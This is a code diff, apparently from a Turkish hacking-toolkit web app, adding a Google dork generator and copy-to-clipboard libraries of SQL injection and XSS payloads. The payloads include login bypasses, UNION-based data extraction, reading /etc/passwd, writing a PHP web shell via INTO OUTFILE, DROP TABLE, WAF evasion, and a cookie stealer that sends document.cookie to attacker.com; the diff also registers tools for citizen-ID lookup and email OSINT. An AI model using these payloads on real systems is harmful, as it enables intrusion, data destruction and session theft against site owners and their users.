+        ]}
+    ];
+
+    const sqliPayloads = [
+        { label: 'Auth Bypass (Classic)', payload: "' OR '1'='1' -- " },
+        { label: 'Auth Bypass (Comment)', payload: "admin'--" },
+        { label: 'Auth Bypass (OR)', payload: "' OR 1=1#" },
+        { label: 'Union Select (Column Count)', payload: "' UNION SELECT NULL,NULL,NULL-- " },
+        { label: 'Union Select (DB Version)', payload: "' UNION SELECT 1,@@version,3-- " },
+        { label: 'Union Select (Tables)', payload: "' UNION SELECT 1,table_name,3 FROM information_schema.tables-- " },
+        { label: 'Union Select (Columns)', payload: "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- " },
+        { label: 'Error Based (ExtractValue)', payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- " },
+        { label: 'Blind Boolean', payload: "' AND 1=1-- (TRUE) / ' AND 1=2-- (FALSE)" },
+        { label: 'Blind Time-Based', payload: "' AND SLEEP(5)-- " },
+        { label: 'Stacked Query', payload: "'; DROP TABLE users;-- " },
+        { label: 'Into Outfile (Shell)', payload: "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- " },
+        { label: 'Load File', payload: "' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- " },
+        { label: 'WAF Bypass (Inline Comment)', payload: "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- " },
+        { label: 'WAF Bypass (Double Encoding)', payload: "%2527%2520OR%25201%253D1--" },
+        { label: 'No Quotes (Numeric)', payload: "1 OR 1=1" },
+        { label: 'ORDER BY (Column Enum)', payload: "' ORDER BY 1-- / ' ORDER BY 5-- " },
+    ];
+
+    const xssPayloads = [
+        { label: 'Basic Alert', payload: '<script>alert("XSS")</script>' },
+        { label: 'IMG Tag OnError', payload: '<img src=x onerror=alert("XSS")>' },
+        { label: 'SVG OnLoad', payload: '<svg onload=alert("XSS")>' },
+        { label: 'Body OnLoad', payload: '<body onload=alert("XSS")>' },
+        { label: 'Event Handler', payload: '<div onmouseover=alert("XSS")>hover me</div>' },
+        { label: 'JavaScript URI', payload: '<a href="javascript:alert(\'XSS\')">click</a>' },
+        { label: 'Iframe Injection', payload: '<iframe src="javascript:alert(\'XSS\')"></iframe>' },
+        { label: 'Input AutoFocus', payload: '<input onfocus=alert("XSS") autofocus>' },
+        { label: 'Details Tag', payload: '<details open ontoggle=alert("XSS")>' },
+        { label: 'Polyglot', payload: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e' },
+        { label: 'Cookie Stealer', payload: '<script>new Image().src="https://attacker.com/steal?c="+document.cookie</script>' },
+        { label: 'DOM Clobbering', payload: '<form id=x><input name=y></form><script>alert(x.y)</script>' },
+        { label: 'Encoded (HTML Entity)', payload: '&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;' },
+        { label: 'Double Encoding', payload: '%253Cscript%253Ealert(%2527XSS%2527)%253C%252Fscript%253E' },
+    ];
+
+    function escapeHtml(str) {
+        return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+    }
+
+    document.getElementById('btn-gen-dork').onclick = () => {
+        const target = document.getElementById('dork-target-input').value.trim() || 'example.com';
+        const resBox = document.getElementById('dork-result-box');
+        playClickSFX();
+
+        let html = `<div style="color:#22c55e; font-weight:800; font-size:0.88rem; margin-bottom:10px;"><i class="fas fa-search"></i> Google Dork Koleksiyonu — ${escapeHtml(target)}</div>`;
+        
+        dorkTemplates.forEach(cat => {
+            html += `<div style="color:#4ade80; font-weight:700; margin:10px 0 6px; font-size:0.82rem;">${cat.cat}</div>`;
+            cat.dorks.forEach(d => {
+                const filled = d.replace(/{target}/g, target);
+                const encoded = encodeURIComponent(filled);
+                html += `
+                    <div style="display:flex; align-items:center; gap:6px; margin-bottom:5px; padding:5px 8px; background:rgba(0,0,0,0.3); border-radius:6px; border-left:3px solid #22c55e;">
+                        <code style="flex:1; font-size:0.72rem; color:#a7f3d0; word-break:break-all;">${escapeHtml(filled)}</code>
+                        <a href="https://www.google.com/search?q=${encoded}" target="_blank" rel="noopener" style="color:#22c55e; font-size:0.7rem; flex-shrink:0;" title="Google'da Ara"><i class="fas fa-external-link-alt"></i></a>
+                        <button class="btn btn-sm" style="padding:2px 6px; font-size:0.65rem; flex-shrink:0;" onclick="navigator.clipboard.writeText(\`${filled.replace(/`/g, '\\`').replace(/\\/g, '\\\\')}\`); showToast('Dork kopyalandı!','success');"><i class="fas fa-copy"></i></button>
+                    </div>
+                `;
+            });
+        });
+
+        playSuccessSFX();
+        resBox.style.display = 'block';
+        resBox.innerHTML = html;
+    };
+
+    document.getElementById('btn-gen-sqli').onclick = () => {
+        const resBox = document.getElementById('dork-result-box');
+        playClickSFX();
+
+        let html = `<div style="color:#ef4444; font-weight:800; font-size:0.88rem; margin-bottom:10px;"><i class="fas fa-syringe"></i> SQL Injection Payload Kütüphanesi (${sqliPayloads.length} Payload)</div>`;
+        
+        sqliPayloads.forEach((p, i) => {
+            html += `
+                <div style="display:flex; align-items:center; gap:6px; margin-bottom:5px; padding:5px 8px; background:rgba(0,0,0,0.3); border-radius:6px; border-left:3px solid #ef4444;">
+                    <span style="color:#f87171; font-size:0.68rem; min-width:24px; text-align:center; font-weight:700;">#${i+1}</span>
+                    <div style="flex:1;">
+                        <div style="font-size:0.68rem; color:#fca5a5; font-weight:600;">${p.label}</div>
+                        <code style="font-size:0.72rem; color:#fecaca; word-break:break-all;">${escapeHtml(p.payload)}</code>
+                    </div>
+                    <button class="btn btn-sm" style="padding:2px 6px; font-size:0.65rem; flex-shrink:0;" onclick="navigator.clipboard.writeText(\`${p.payload.replace(/`/g, '\\`').replace(/\\/g, '\\\\')}\`); showToast('Payload kopyalandı!','success');"><i class="fas fa-copy"></i></button>
+                </div>
+            `;
+        });
+
+        playSuccessSFX();
+        resBox.style.display = 'block';
+        resBox.innerHTML = html;
+    };
+
+    document.getElementById('btn-gen-xss').onclick = () => {
+        const resBox = document.getElementById('dork-result-box');
+        playClickSFX();
+
+        let html = `<div style="color:#f59e0b; font-weight:800; font-size:0.88rem; margin-bottom:10px;"><i class="fas fa-code"></i> XSS Payload Kütüphanesi (${xssPayloads.length} Payload)</div>`;
+        
+        xssPayloads.forEach((p, i) => {
+            html += `
+                <div style="display:flex; align-items:center; gap:6px; margin-bottom:5px; padding:5px 8px; background:rgba(0,0,0,0.3); border-radius:6px; border-left:3px solid #f59e0b;">
+                    <span style="color:#fbbf24; font-size:0.68rem; min-width:24px; text-align:center; font-weight:700;">#${i+1}</span>
+                    <div style="flex:1;">
+                        <div style="font-size:0.68rem; color:#fde68a; font-weight:600;">${p.label}</div>
+                        <code style="font-size:0.72rem; color:#fef3c7; word-break:break-all;">${escapeHtml(p.payload)}</code>
+                    </div>
+                    <button class="btn btn-sm" style="padding:2px 6px; font-size:0.65rem; flex-shrink:0;" onclick="navigator.clipboard.writeText(\`${escapeHtml(p.payload).replace(/`/g, '\\`').replace(/\\/g, '\\\\')}\`); showToast('Payload kopyalandı!','success');"><i class="fas fa-copy"></i></button>
+                </div>
+            `;
+        });
+
+        playSuccessSFX();
+        resBox.style.display = 'block';
+        resBox.innerHTML = html;
+    };
+}
+
 // Extra tools buton dinleyicileri bağlama
 document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('access-extra-btn')?.addEventListener('click', () => {
@@ -3972,6 +4607,9 @@ document.addEventListener('DOMContentLoaded', () => {
     bindTool('tool-antidebug', openAntiDebugProtectionStatus);
     bindTool('tool-base64img', openBase64HexStudio);
     bindTool('tool-obfuscator', openCodeObfuscator);
+    bindTool('tool-mernis', openMernisSorgu);
+    bindTool('tool-emailhunter', openEmailOSINT);
+    bindTool('tool-dorkgen', openDorkGenerator);
 });
 
 // ==================== 11. ADVANCED CONVERSATIONAL AI ENGINE v5.0 ====================
